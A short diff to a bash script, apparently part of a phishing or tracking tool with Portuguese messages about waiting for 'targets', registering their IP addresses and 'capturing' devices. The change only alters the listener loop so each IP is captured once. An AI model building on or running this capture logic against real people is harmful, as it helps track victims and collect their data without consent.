@@ -153,11 +153,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 log "${WAIT} Aguardando alvos... Ctrl + C para sair"
 while true; do
-  if [[ -e "ip.txt" ]]; then
+  if [[ -e "ip.txt" && $ip_captured == false ]]; then
     success "IP registrado no sistema"
     catch_ip
-    rm -rf ip.txt
-  fi
+  ip_captured=true
+fi
+
   sleep 0.5
   if [[ -e "Log.log" ]]; then
     capture "Dispositivo ${GREEN}CAPTURADO${RESET} com sucesso"
